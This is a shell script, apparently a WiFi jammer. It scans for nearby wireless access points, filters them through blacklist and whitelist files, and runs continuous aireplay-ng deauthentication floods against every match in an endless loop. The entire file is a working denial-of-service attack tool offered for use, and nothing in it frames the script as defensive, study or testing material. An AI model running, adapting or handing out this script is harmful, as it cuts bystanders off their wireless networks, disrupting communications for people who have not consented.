#!/bin/sh

MYPATH="$(dirname $0)/"

DEAUTHS=`cat ${MYPATH}jammer.conf | grep "packet" | awk -F = '{print $2}'`
MYWAIT=`cat ${MYPATH}jammer.conf | grep "sleep" | awk -F = '{print $2}'`

MYMONITOR=`cat ${MYPATH}jammer.conf | grep "monitor" | awk -F = '{print $2}'`
MYINTERFACE=`cat ${MYPATH}jammer.conf | grep "interface" | awk -F = '{print $2}'`

MYMAC=`ifconfig | grep ${MYINTERFACE} | grep -v ${MYMONITOR} | awk '{print $5}'`

SCANTMP=${MYPATH}scan
APLIST=${MYPATH}ap
LOG=${MYPATH}log
WHITELIST=${MYPATH}rules/whitelist.lst
TMPWHITELIST=${MYPATH}rules/whitelist.tmp
BLACKLIST=${MYPATH}rules/blacklist.lst
TMPBLACKLIST=${MYPATH}rules/blacklist.tmp

killall -9 aireplay-ng
rm ${MYPATH}stationlist/*.txt
rm ${SCANTMP}
rm ${APLIST}
rm ${TMPWHITELIST}
rm ${TMPBLACKLIST}
rm ${LOG}

echo -e "Starting WiFi Jammer..." > ${LOG}

if [ -z "$MYINTERFACE" ]; then
	MYINTERFACE=`iwconfig 2> /dev/null | grep "Mode:Master" | awk '{print $1}' | head -1`
else
	MYFLAG=`iwconfig 2> /dev/null | awk '{print $1}' | grep ${MYINTERFACE}`
	
	if [ -z "$MYFLAG" ]; then
	    MYINTERFACE=`iwconfig 2> /dev/null | grep "Mode:Master" | awk '{print $1}' | head -1`
	fi
fi

if [ -z "$MYMONITOR" ]; then
	MYMONITOR=`iwconfig 2> /dev/null | grep "Mode:Monitor" | awk '{print $1}' | head -1`
   
	MYFLAG=`iwconfig 2> /dev/null | awk '{print $1}' | grep ${MYMONITOR}`
	
	if [ -z "$MYFLAG" ]; then
	    airmon-ng start ${MYINTERFACE}
	    MYMONITOR=`iwconfig 2> /dev/null | grep "Mode:Monitor" | awk '{print $1}' | head -1`
	fi
else
	MYFLAG=`iwconfig 2> /dev/null | awk '{print $1}' | grep ${MYMONITOR}`
	
	if [ -z "$MYFLAG" ]; then
	    airmon-ng start ${MYINTERFACE}
	    MYMONITOR=`iwconfig 2> /dev/null | grep "Mode:Monitor" | awk '{print $1}' | head -1`
	fi
fi

echo -e "Interface : ${MYINTERFACE}" >> ${LOG}
echo -e "Monitor : ${MYMONITOR}" >> ${LOG}

if [ -n "$DEAUTHS" ]; then
	echo -e "Number of deauths to send : ${DEAUTHS}" >> ${LOG}
else
	echo -e "Number of deauths to send : default" >> ${LOG}
	DEAUTHS=0
fi

if [ -n "$MYWAIT" ]; then
	echo -e "Sleeping time in seconds : ${MYWAIT}" >> ${LOG}
else
	echo -e "Sleeping time in seconds : default" >> ${LOG}
	MYWAIT=10
fi

ifconfig ${MYINTERFACE} down
ifconfig ${MYINTERFACE} up

grep -hv -e ^# ${WHITELIST} -e ^$ > ${TMPWHITELIST}
grep -hv -e ^# ${BLACKLIST} -e ^$ > ${TMPBLACKLIST}

while true
do
	if [ -e ${SCANTMP} ]; then rm ${SCANTMP} ; fi
	if [ -e ${APLIST} ]; then rm ${APLIST} ; fi
	
	iwlist ${MYINTERFACE} scan > ${SCANTMP}
	sleep 2
	cat ${SCANTMP} | grep "Address:" | grep -v ${MYMAC} | grep -Ef ${TMPBLACKLIST} | grep -vEf ${TMPWHITELIST} | cut -b 30-60 > ${APLIST}
	
	lineNum=`wc -l ${APLIST} | awk '{ print $1}'`
	current=`sed -n -e ''${i}'p' ${APLIST}`
	
	i=1
	while [ ${i} -le ${lineNum} ]
	do
		current=`sed -n -e ''${i}'p' ${APLIST}`
		
		if [ -e ${MYPATH}stationlist/${current}.txt ];then
			#echo -e "DeAuth'ing ${current} already running... (${i}/${lineNum})" >> ${LOG}
			echo "" > /dev/null
		else
			#echo -e "DeAuth'ing ${current}... (${i}/${lineNum})" >> ${LOG}
			
			if [ ${DEAUTHS} -ne 0 ];then
				echo -e "DeAuth'ing ${current} (${DEAUTHS} deauths sent)..." >> ${LOG}
			else
				echo -e "DeAuth'ing ${current}..." >> ${LOG}
				echo "${current}" > ${MYPATH}stationlist/${current}.txt &
			fi

			aireplay-ng -0 ${DEAUTHS} --ignore-negative-one -D -a ${current} ${MYMONITOR} &
		fi
		i=`expr $i + 1`
	done
	
	if [ ${MYWAIT} -ne 0 ];then
		echo -e "Sleeping for ${MYWAIT} seconds..." >> ${LOG}
	fi
		
	sleep ${MYWAIT}
	
done
